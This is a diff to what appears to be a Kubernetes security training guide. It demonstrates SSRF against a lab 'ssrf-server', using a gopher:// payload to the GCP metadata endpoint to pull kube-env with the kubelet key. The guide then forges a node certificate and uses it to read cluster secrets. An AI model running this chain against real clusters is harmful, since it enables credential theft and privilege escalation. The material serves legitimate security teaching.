@@ -72,7 +72,7 @@ exit
 ## Demo 2: Workload Identity
 #### Port-forward
 ```
-kubectl port-forward deployment/ssrf-server 8080:8080
+kubectl port-forward deployment/ssrf-server 8080:8080 2>&1 >/dev/null &
 ```
 
 #### Open Web Preview
@@ -90,33 +90,49 @@ gopher://169.254.169.254:80/_GET /computeMetadata/v1/instance/attributes/kube-en
 ```
 It contains "KUBELET_KEY".
 
-#### Save the metadata
-- ctrl+A and store all result to `metadata-script/metadata.txt` file
-  - TODO: ADD image
+#### Save the metadata to metadata-script/metadata.txt
+```
+cd metadata-script
+```
+
+```
+curl -X POST 'http://localhost:8080/get_contents' --data 'url=gopher%3A%2F%2F169.254.169.254%3A80%2F_GET+%2FcomputeMetadata%2Fv1%2Finstance%2Fattributes%2Fkube-env%3Falt%3Djson+HTTP%2F1.1%250d%250aMetadata-Flavor%3A+Google%250d%250aConnection%3A+Close%250d%250a%250d%250a' -o metadata.txt
+```
+
+- Move current kubeconfig file
+```
+mv ~/.kube/config ~/.kube/config.tmp
+```
+```
+kubectl config get-contexts
+```
 
 #### Get node certificate
+- Extract necessary data from metadata
 ```bash
-cd metadata-script
-
-# Extract necessary data from metadata
 bash extract.sh
 ls -l metadata
+```
 
-# Get node certificate
+- Send CSR and Get node certificate
+```
 bash make_cert.sh $(cat metadata/nodename)
 ```
 
 #### Get credentials
+- Set env vars
 ```
-# Set env vars
-KUBE_OPT="--client-certificate newcert/node.crt --client-key newcert/new.key --certificate-authority metadata/ca.crt --server https://$(cat metadata/api_ip)"
-echo $KUBE_OPT
+KUBE_OPT="--client-certificate newcert/node.crt --client-key newcert/new.key --certificate-authority metadata/ca.crt --server https://$(cat metadata/api_ip)" && echo $KUBE_OPT
+```
 
-# Get secretName
-kubectl describe pod | grep secret
+- Get secretName
+```
+kubectl $KUBE_OPT describe pod | grep secret
+```
 
-# Get secret
-kubectl get secret dummy-secret -o yaml
+- Get secret
+```
+kubectl $KUBE_OPT get secret dummy-secret -o yaml
 ```
 
 #### (Reference) Get instance token (doesn't use it in this training)
